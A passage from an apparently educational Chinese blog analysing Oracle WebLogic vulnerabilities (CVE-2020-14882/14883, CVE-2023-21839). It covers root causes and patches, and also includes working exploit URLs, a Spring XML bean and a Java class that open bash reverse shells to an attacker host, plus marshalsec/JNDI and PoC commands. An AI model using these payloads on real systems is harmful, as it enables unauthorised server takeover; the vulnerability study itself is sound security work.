<li>WebLogic 版本为 <strong>10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</strong> 。  </li>
<li>开发模式或生产模式下启用了“Web 服务测试页”选项。</li>
</ul>
</li>
<li><strong>攻击前提</strong>：  <ul>
<li>需获取 WebLogic 管理端登录凭据（弱口令或通过日志泄露）。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="4-漏洞技术细节"><a href="#4-漏洞技术细节" class="headerlink" title="4. 漏洞技术细节"></a><strong>4. 漏洞技术细节</strong></h4><ul>
<li><strong>路径校验缺失</strong>：<br>WebLogic 在处理 <code>Work Home Dir</code> 修改时，未验证路径合法性，攻击者可将其指向任意可写目录（如静态资源目录）。程序自动复制文件时，未过滤危险文件类型（如 JSP）。  </li>
<li><strong>文件名拼接漏洞</strong>：<br>文件名由 <code>timestamp</code> 参数与上传文件名拼接生成，未进行过滤，导致攻击者可控制最终文件名。  </li>
<li><strong>权限控制缺陷</strong>：<br><code>config.do</code> 和 <code>begin.do</code> 页面在开发模式下无需认证即可访问，生产模式下虽需认证，但若攻击者获取凭据仍可触发漏洞。</li>
</ul>
<hr>
<h4 id="5-防御与修复建议"><a href="#5-防御与修复建议" class="headerlink" title="5. 防御与修复建议"></a><strong>5. 防御与修复建议</strong></h4><ol>
<li><strong>官方补丁</strong>：升级至 Oracle 2018 年 7 月及之后的版本，修复路径校验和文件名生成逻辑。  </li>
<li><strong>访问控制</strong>：  <ul>
<li>禁用 <code>config.do</code> 和 <code>begin.do</code> 页面的未授权访问。  </li>
<li>在生产模式下关闭“Web 服务测试页”功能。</li>
</ul>
</li>
<li><strong>网络隔离</strong>：限制 WebLogic 管理端（7001 端口）的公网暴露。  </li>
<li><strong>入侵检测</strong>：部署 IPS&#x2F;WAF 监控对 <code>/ws_utc/</code> 路径的异常请求。</li>
</ol>
<hr>
<h4 id="6-漏洞影响与意义"><a href="#6-漏洞影响与意义" class="headerlink" title="6. 漏洞影响与意义"></a><strong>6. 漏洞影响与意义</strong></h4><p>该漏洞 CVSS 评分为 <strong>9.8</strong>，攻击者可利用低权限账户或弱口令直接上传 Webshell，导致服务器完全沦陷。其技术意义在于揭示了中间件管理界面设计中的权限校验缺陷，以及路径控制不严导致的文件操作风险。</p>
<h3 id="8-CVE-2020-14882"><a href="#8-CVE-2020-14882" class="headerlink" title="8.CVE-2020-14882"></a>8.CVE-2020-14882</h3><p>以下是关于 <strong>CVE-2020-14882</strong> 漏洞核心原理的详细解析，结合多个技术分析来源总结其攻击路径与关键机制：</p>
<hr>
<h4 id="1-漏洞背景与影响"><a href="#1-漏洞背景与影响" class="headerlink" title="1. 漏洞背景与影响"></a><strong>1. 漏洞背景与影响</strong></h4><p><strong>CVE-2020-14882</strong> 是 Oracle WebLogic Server 管理控制台中的一个权限绕过漏洞，允许未经身份验证的攻击者直接访问后台管理界面。结合 <strong>CVE-2020-14883</strong>（后台任意命令执行漏洞），攻击者可构造完整的利用链，实现远程代码执行（RCE）并完全控制目标服务器。<br><strong>影响版本</strong>：WebLogic 10.3.6.0、12.1.3.0、12.2.1.3、12.2.1.4、14.1.1.0。</p>
<hr>
<h4 id="2-核心原理分析"><a href="#2-核心原理分析" class="headerlink" title="2. 核心原理分析"></a><strong>2. 核心原理分析</strong></h4><h5 id="2-1-静态资源路径校验缺陷"><a href="#2-1-静态资源路径校验缺陷" class="headerlink" title="2.1 静态资源路径校验缺陷"></a><strong>2.1 静态资源路径校验缺陷</strong></h5><p>WebLogic 管理控制台（<code>/console</code>）在处理静态资源请求时（如 <code>/css/*</code>、<code>/images/*</code>），未对请求路径进行严格的权限验证。攻击者通过构造 <strong>二次URL编码的路径穿越符号</strong>（<code>%252E%252E%252F</code>，即 <code>../</code>），将请求伪装为静态资源访问，绕过权限校验逻辑。<br><strong>示例攻击URL</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target:7001/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>
<p>此路径解码后为 <code>/console/../console.portal</code>，指向管理控制台的核心入口文件 <code>console.portal</code>，而 WebLogic 误认为该请求属于静态资源目录，从而跳过身份验证。</p>
<h5 id="2-2-请求分派与权限校验流程"><a href="#2-2-请求分派与权限校验流程" class="headerlink" title="2.2 请求分派与权限校验流程"></a><strong>2.2 请求分派与权限校验流程</strong></h5><ol>
<li><strong>静态资源白名单机制</strong>：<br>WebLogic 的 <code>WebAppSecurity</code> 模块维护了一个静态资源列表（如 CSS、JS 文件），标记为 <code>unrestricted</code>（无需认证）。攻击者通过路径穿越使请求匹配到白名单中的静态资源路径，触发 <code>unrestricted=true</code>，绕过 <code>checkAccess</code> 权限检查。</li>
<li><strong>Servlet 分派逻辑</strong>：<br>请求最终被分派至 <code>AsyncInitServlet</code>，并进一步调用 <code>MBeanUtilsInitSingleFileServlet</code> 处理 <code>.portal</code> 文件。由于权限校验已绕过，攻击者可加载并解析 <code>console.portal</code> 文件，进入后台管理界面。</li>
</ol>
<h5 id="2-3-生命周期触发点"><a href="#2-3-生命周期触发点" class="headerlink" title="2.3 生命周期触发点"></a><strong>2.3 生命周期触发点</strong></h5><p>通过访问 <code>.portal</code> 文件，WebLogic 会触发 <strong>UI控件树的生命周期方法</strong>（如 <code>init</code>、<code>handlePostbackData</code>）。在解析控件树时，若请求参数包含 <code>_nfpb=true</code>，系统会调用 <code>runInbound</code> 方法，执行 <code>HandleFactory.getHandle()</code>，从而触发后续的代码执行逻辑（需结合 CVE-2020-14883）。</p>
<hr>
<h4 id="3-漏洞利用链示例"><a href="#3-漏洞利用链示例" class="headerlink" title="3. 漏洞利用链示例"></a><strong>3. 漏洞利用链示例</strong></h4><h5 id="3-1-权限绕过（CVE-2020-14882）"><a href="#3-1-权限绕过（CVE-2020-14882）" class="headerlink" title="3.1 权限绕过（CVE-2020-14882）"></a><strong>3.1 权限绕过（CVE-2020-14882）</strong></h5><ul>
<li><strong>构造恶意URL</strong>：利用路径穿越访问管理后台。</li>
<li><strong>绕过结果</strong>：直接进入部署管理页面，但权限受限（无法直接部署应用）。</li>
<li>可集合14883实现远程RCE</li>
</ul>
<hr>
<h4 id="4-补丁与修复机制"><a href="#4-补丁与修复机制" class="headerlink" title="4. 补丁与修复机制"></a><strong>4. 补丁与修复机制</strong></h4><p>Oracle 通过以下方式修复漏洞：</p>
<ol>
<li><strong>路径黑名单检测</strong>：增加对 <code>../</code> 等路径穿越符号的过滤。</li>
<li><strong>权限校验增强</strong>：在 <code>MBeanUtilsInitSingleFileServlet</code> 处理前强制验证用户身份。</li>
<li><strong>静态资源列表更新</strong>：限制非必要路径的 <code>unrestricted</code> 属性。</li>
</ol>
<hr>
<h4 id="5-总结-1"><a href="#5-总结-1" class="headerlink" title="5. 总结"></a><strong>5. 总结</strong></h4><p>CVE-2020-14882 的本质是 <strong>WebLogic 对静态资源路径的权限校验逻辑缺陷</strong>，结合 URL 编码与路径穿越实现未授权访问。其危害性在于为后续代码执行漏洞（CVE-2020-14883）提供了攻击入口，形成完整的 RCE 利用链。防御建议包括及时安装官方补丁、禁用未使用的协议端口，并严格限制管理控制台的访问来源。</p>
<h3 id="9-CVE-2020-14883"><a href="#9-CVE-2020-14883" class="headerlink" title="9.CVE-2020-14883"></a>9.CVE-2020-14883</h3><p>以下是关于 <strong>CVE-2020-14883</strong> 漏洞核心原理的深度解析，结合多个技术分析来源总结其攻击路径与关键机制：</p>
<hr>
<h4 id="1-漏洞背景与定位"><a href="#1-漏洞背景与定位" class="headerlink" title="1. 漏洞背景与定位"></a><strong>1. 漏洞背景与定位</strong></h4><p><strong>CVE-2020-14883</strong> 是 Oracle WebLogic Server 管理控制台中的远程命令执行漏洞，需与 <strong>CVE-2020-14882</strong>（权限绕过漏洞）结合形成完整的利用链。攻击者通过构造特殊的 HTTP 请求，在未授权的情况下直接执行系统命令，最终完全控制目标服务器。<br><strong>影响版本</strong>：WebLogic 10.3.6.0、12.1.3.0、12.2.1.3、12.2.1.4、14.1.1.0。</p>
<hr>
<h4 id="2-核心原理分析-1"><a href="#2-核心原理分析-1" class="headerlink" title="2. 核心原理分析"></a><strong>2. 核心原理分析</strong></h4><h5 id="2-1-漏洞触发点"><a href="#2-1-漏洞触发点" class="headerlink" title="2.1 漏洞触发点"></a><strong>2.1 漏洞触发点</strong></h5><p>漏洞的核心在于 WebLogic 管理控制台对 HTTP 请求参数 <code>handle</code> 的处理逻辑存在缺陷。当攻击者通过 CVE-2020-14882 绕过权限验证后，可利用 <code>handle</code> 参数注入恶意类名和代码，触发以下两类关键组件的反序列化或类加载过程：</p>
<ol>
<li><p><strong><code>com.tangosol.coherence.mvel2.sh.ShellSession</code></strong>  </p>
<ul>
<li><strong>适用版本</strong>：WebLogic 12.2.1+（低版本无此类）  </li>
<li><strong>机制</strong>：通过反射调用 <code>ShellSession</code> 类的构造函数，传入恶意代码（如 <code>java.lang.Runtime.exec()</code>）直接执行系统命令。  </li>
<li><strong>示例利用</strong>：  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;Runtime.getRuntime().exec(&#x27;calc&#x27;);&quot;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong><code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code></strong>  </p>
<ul>
<li><strong>适用版本</strong>：全版本（通过 Spring 框架漏洞）  </li>
<li><strong>机制</strong>：加载远程 XML 文件，利用 Spring 的依赖注入机制实例化 <code>ProcessBuilder</code>，通过 <code>init-method=&quot;start&quot;</code> 触发命令执行。  </li>
<li><strong>恶意 XML 示例</strong>：  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/攻击机IP/端口 0&gt;&amp;1]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h5 id="2-2-关键代码流程"><a href="#2-2-关键代码流程" class="headerlink" title="2.2 关键代码流程"></a><strong>2.2 关键代码流程</strong></h5><ol>
<li><p><strong>请求分派</strong>：<br>绕过权限后，请求被分派至 <code>AsyncInitServlet</code>，最终调用 <code>UIServlet</code> 处理 <code>.portal</code> 文件，触发控件树的生命周期方法（如 <code>init</code>、<code>handlePostbackData</code>）。</p>
</li>
<li><p><strong>参数解析与类加载</strong>：  </p>
<ul>
<li><code>handle</code> 参数通过 <code>MarshalledObject</code> 反序列化机制加载指定类。  </li>
<li><code>FileSystemXmlApplicationContext</code> 类在初始化时，会解析远程 XML 文件并执行其中定义的 <code>ProcessBuilder</code> 逻辑。</li>
</ul>
</li>
<li><p><strong>安全机制缺陷</strong>：  </p>
<ul>
<li><strong>黑名单缺失</strong>：未对 <code>ShellSession</code> 和 <code>FileSystemXmlApplicationContext</code> 进行有效拦截。  </li>
<li><strong>输入验证不足</strong>：未对 <code>handle</code> 参数的内容进行合法性校验，导致任意类实例化。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="3-利用链与攻击场景"><a href="#3-利用链与攻击场景" class="headerlink" title="3. 利用链与攻击场景"></a><strong>3. 利用链与攻击场景</strong></h4><h5 id="3-1-利用条件"><a href="#3-1-利用条件" class="headerlink" title="3.1 利用条件"></a><strong>3.1 利用条件</strong></h5><ul>
<li><strong>前置条件</strong>：需通过 CVE-2020-14882 绕过权限访问后台。  </li>
<li><strong>网络要求</strong>：  <ul>
<li><code>ShellSession</code> 类需存在于目标版本中（仅限高版本）。  </li>
<li><code>FileSystemXmlApplicationContext</code> 需目标服务器能访问攻击者提供的 XML 文件（需出网）。</li>
</ul>
</li>
</ul>
<h5 id="3-2-典型攻击步骤"><a href="#3-2-典型攻击步骤" class="headerlink" title="3.2 典型攻击步骤"></a><strong>3.2 典型攻击步骤</strong></h5><ol>
<li><p><strong>权限绕过</strong>：<br>构造 URL 路径穿越访问管理后台：  </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target:7001/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>命令执行</strong>：  </p>
<ul>
<li><p><strong>方式一（ShellSession）</strong>：<br>直接注入命令（如创建文件或反弹 Shell）：  </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#x27;touch%20/tmp/success1&#x27;);&quot;)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>方式二（XML 加载）</strong>：  </p>
<ul>
<li>编写一个和cve-2019-2725利用链类似的xml文件</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/attack_ip/1234 0&gt;&amp;1]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>启动http服务<code>python3 -m http.server 80</code></li>
<li>部署恶意 XML 文件并触发加载（hackbar）：</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://attack_ip/rce.xml&quot;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<p>​	          nc端口监听	      <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250406014919144.png?x-oss-process=style/img-to-webp" alt="image-20250406014919144">	       </p>
<h4 id="4-补丁与修复机制-1"><a href="#4-补丁与修复机制-1" class="headerlink" title="4. 补丁与修复机制"></a><strong>4. 补丁与修复机制</strong></h4><p>Oracle 通过以下方式修复漏洞：  </p>
<ol>
<li><strong>类黑名单更新</strong>：将 <code>ShellSession</code> 和 <code>FileSystemXmlApplicationContext</code> 加入反序列化黑名单。  </li>
<li><strong>输入过滤增强</strong>：对 <code>handle</code> 参数进行严格校验，禁止加载未授权的类。  </li>
<li><strong>协议限制</strong>：建议禁用 T3&#x2F;IIOP 协议或限制访问来源。</li>
</ol>
<hr>
<h4 id="5-总结与防御建议"><a href="#5-总结与防御建议" class="headerlink" title="5. 总结与防御建议"></a><strong>5. 总结与防御建议</strong></h4><p>CVE-2020-14883 的根源在于 WebLogic 对用户输入的控制不足，结合高危类加载机制导致 RCE。其危害性在未授权访问漏洞（CVE-2020-14882）的加持下被放大，形成完整的攻击链。<br><strong>防御建议</strong>：  </p>
<ul>
<li><strong>补丁升级</strong>：及时安装 Oracle 官方季度补丁。  </li>
<li><strong>协议加固</strong>：禁用 T3&#x2F;IIOP 协议或配置 IP 白名单。  </li>
<li><strong>网络隔离</strong>：限制管理控制台的访问范围，避免暴露在公网。</li>
</ul>
<h3 id="CVE-2023-21839"><a href="#CVE-2023-21839" class="headerlink" title="CVE-2023-21839"></a>CVE-2023-21839</h3><p>以下是关于 <strong>CVE-2023-21839</strong> 漏洞核心原理的深度解析，结合多个技术分析来源总结其攻击路径、触发机制及修复方案：</p>
<h4 id="1-漏洞背景与影响-1"><a href="#1-漏洞背景与影响-1" class="headerlink" title="1. 漏洞背景与影响"></a><strong>1. 漏洞背景与影响</strong></h4><p><strong>CVE-2023-21839</strong> 是 Oracle WebLogic Server 中的一个高危远程代码执行漏洞，允许未经身份验证的攻击者通过 T3&#x2F;IIOP 协议远程接管服务器。该漏洞利用 WebLogic 核心组件的反序列化机制缺陷，结合 JNDI 注入实现任意代码执行。<br><strong>影响版本</strong>：  </p>
<ul>
<li>WebLogic 12.2.1.3.0  </li>
<li>WebLogic 12.2.1.4.0  </li>
<li>WebLogic 14.1.1.0.0 。</li>
</ul>
<hr>
<h4 id="2-核心原理分析-2"><a href="#2-核心原理分析-2" class="headerlink" title="2. 核心原理分析"></a><strong>2. 核心原理分析</strong></h4><h5 id="2-1-漏洞触发机制"><a href="#2-1-漏洞触发机制" class="headerlink" title="2.1 漏洞触发机制"></a><strong>2.1 漏洞触发机制</strong></h5><p>漏洞的核心在于 WebLogic 对 <strong>T3&#x2F;IIOP 协议</strong> 的远程对象绑定（Bind）和反序列化逻辑存在缺陷。具体流程如下：  </p>
<ol>
<li><strong>远程对象绑定</strong>：攻击者通过 T3&#x2F;IIOP 协议将恶意对象绑定到 WebLogic 服务端，该对象需继承自 <code>OpaqueReference</code> 接口 。  </li>
<li><strong>lookup 操作触发</strong>：当服务端通过 <code>lookup</code> 方法访问绑定的远程对象时，会调用其 <code>getReferent()</code> 方法。  </li>
<li><strong>JNDI 注入</strong>：在 <code>weblogic.deployment.jms.ForeignOpaqueReference</code> 类的 <code>getReferent</code> 方法中，存在以下关键代码：  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retVal = context.lookup(<span class="built_in">this</span>.remoteJNDIName);</span><br></pre></td></tr></table></figure>
其中 <code>remoteJNDIName</code> 参数由攻击者控制，可指向恶意 RMI&#x2F;LDAP 服务地址，触发 JNDI 注入 。  </li>
<li><strong>远程类加载与代码执行</strong>：通过 JNDI 注入加载远程恶意类（如利用 <code>ldap://</code> 协议），触发反序列化或动态类加载，最终执行任意系统命令。</li>
</ol>
<h5 id="2-2-关键组件缺陷"><a href="#2-2-关键组件缺陷" class="headerlink" title="2.2 关键组件缺陷"></a><strong>2.2 关键组件缺陷</strong></h5><ul>
<li><strong>协议支持</strong>：T3&#x2F;IIOP 协议默认开放且允许远程绑定对象，未对绑定内容进行严格校验。  </li>
<li><strong>黑名单绕过</strong>：WebLogic 的反序列化黑名单未覆盖 <code>ForeignOpaqueReference</code> 类及其依赖的 JNDI 上下文机制。  </li>
<li><strong>输入验证缺失</strong>：未对 <code>remoteJNDIName</code> 参数进行合法性检查，导致攻击者可注入任意 JNDI 地址 。</li>
</ul>
<hr>
<h4 id="3-漏洞利用链"><a href="#3-漏洞利用链" class="headerlink" title="3. 漏洞利用链"></a><strong>3. 漏洞利用链</strong></h4><h5 id="3-1-典型攻击步骤"><a href="#3-1-典型攻击步骤" class="headerlink" title="3.1 典型攻击步骤"></a><strong>3.1 典型攻击步骤</strong></h5><ol>
<li><strong>构造恶意对象</strong>：生成继承自 <code>OpaqueReference</code> 的远程对象，设置 <code>remoteJNDIName</code> 为攻击者控制的 LDAP&#x2F;RMI 服务地址。  </li>
<li><strong>绑定对象至服务端</strong>：通过 T3&#x2F;IIOP 协议将恶意对象发送至目标 WebLogic 服务器。  </li>
<li><strong>触发 lookup 操作</strong>：诱导服务端调用 <code>lookup</code> 方法访问该对象，触发 <code>getReferent</code> 方法中的 JNDI 注入。  </li>
<li><strong>加载远程恶意类</strong>：服务端通过 LDAP&#x2F;RMI 协议下载并加载攻击者提供的恶意类（如 <code>ReverseShell</code> 或 <code>ProcessBuilder</code>），执行系统命令 。</li>
</ol>
<h5 id="3-2-工具依赖"><a href="#3-2-工具依赖" class="headerlink" title="3.2 工具依赖"></a><strong>3.2 工具依赖</strong></h5><ul>
<li><strong>JNDIExploit</strong>：用于搭建恶意 LDAP 服务，托管恶意类文件并生成反向 Shell 载荷。  </li>
<li><strong>CVE-2023-21839 PoC 工具</strong>：自动化生成攻击请求，指定目标 IP、端口及恶意 JNDI 地址 。</li>
</ul>
<hr>
<h4 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h4><h5 id="方式一：使用自动化-PoC-工具"><a href="#方式一：使用自动化-PoC-工具" class="headerlink" title="方式一：使用自动化 PoC 工具"></a><strong>方式一：使用自动化 PoC 工具</strong></h5><ul>
<li><p><strong>编写恶意类并编译</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.100.129/1234 0&gt;&amp;1&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>编译命令<code>javac exp.java</code></li>
</ul>
</li>
<li><p><strong>HTTP服务公开恶意类</strong></p>
<ul>
<li><code>python -m http.server 80</code></li>
</ul>
</li>
<li><p><strong>启动 JNDI 服务</strong></p>
</li>
<li><p>在攻击机上运行marshalsec，监听 LDAP&#x2F;RMI 服务并托管恶意类：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://attacker/#exp&quot;</span> 1089</span><br></pre></td></tr></table></figure>

</li>
<li><p><strong>端口监听</strong></p>
<ul>
<li><code>nc -lvnp 1234</code></li>
</ul>
</li>
<li><p><strong>下载并的PoC</strong></p>
</li>
</ul>
<ol>
<li><p><a target="_blank" rel="noopener" href="https://github.com/DXask88MA/Weblogic-CVE-2023-21839">Weblogic-CVE-2023-21839</a></p>
</li>
<li><p>执行攻击命令：</p>
</li>
</ol>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar Weblogic-CVE-2023-21839.jar target_ip:7001 ldap://attacker_ip:1089/exp</span><br></pre></td></tr></table></figure>


<ul>
<li><strong>获取反弹 Shell</strong><ul>
<li>成功执行后，攻击机的 <code>nc</code> 监听端口将接收到目标服务器的 Shell 连接，实现远程控制。</li>
</ul>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250406023154642.png?x-oss-process=style/img-to-webp" alt="image-20250406023154642"></p>
<hr>
<h5 id="方式二：手动编写-Java-PoC"><a href="#方式二：手动编写-Java-PoC" class="headerlink" title="方式二：手动编写 Java PoC"></a><strong>方式二：手动编写 Java PoC</strong></h5><ol>
<li><p><strong>构造恶意对象</strong></p>
<ul>
<li><p>利用 <code>ForeignOpaqueReference</code> 类注入可控的 <code>remoteJNDIName</code>，触发 JNDI 注入：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 示例代码（简化）</span></span><br><span class="line"><span class="type">InitialContext</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">ForeignOpaqueReference</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ForeignOpaqueReference</span>();</span><br><span class="line">f.setRemoteJNDIName(<span class="string">&quot;ldap://攻击机IP:1389/Basic/Command/calc&quot;</span>);</span><br><span class="line">c.bind(<span class="string">&quot;恶意对象名称&quot;</span>, f);</span><br><span class="line">c.lookup(<span class="string">&quot;恶意对象名称&quot;</span>);  <span class="comment">// 触发漏洞</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>关键点</strong>：通过反射修改 <code>jndiEnvironment</code> 和 <code>remoteJNDIName</code> 字段，指向攻击者控制的 LDAP 服务。</p>
</li>
</ul>
</li>
<li><p><strong>托管恶意类文件</strong></p>
<ul>
<li>在 JNDIExploit 的 HTTP 服务路径下放置恶意 XML 或 Java 类文件（如 <code>ReverseShell.class</code>），通过 LDAP 服务动态加载79。</li>
</ul>
</li>
<li><p><strong>触发漏洞</strong></p>
<ul>
<li>运行 Java PoC 代码，目标服务器将向攻击机的 LDAP 服务发起请求，加载并执行恶意代码。</li>
</ul>
</li>
</ol>
<h4 id="4-修复与缓解措施"><a href="#4-修复与缓解措施" class="headerlink" title="4. 修复与缓解措施"></a><strong>4. 修复与缓解措施</strong></h4><h5 id="4-1-官方补丁"><a href="#4-1-官方补丁" class="headerlink" title="4.1 官方补丁"></a><strong>4.1 官方补丁</strong></h5><p>Oracle 通过以下方式修复漏洞：  </p>
<ol>
<li><strong>黑名单更新</strong>：将 <code>ForeignOpaqueReference</code> 及相关危险类加入反序列化黑名单。  </li>
<li><strong>协议限制</strong>：增强 T3&#x2F;IIOP 协议的安全性校验，限制未授权绑定操作 。</li>
</ol>
<h5 id="4-2-临时缓解方案"><a href="#4-2-临时缓解方案" class="headerlink" title="4.2 临时缓解方案"></a><strong>4.2 临时缓解方案</strong></h5><ol>
<li><strong>禁用 T3&#x2F;IIOP 协议</strong>：  <ul>
<li>通过 WebLogic 控制台关闭 IIOP 协议。  </li>
<li>使用连接筛选器（<code>ConnectionFilterImpl</code>）限制 T3 协议访问来源 。</li>
</ul>
</li>
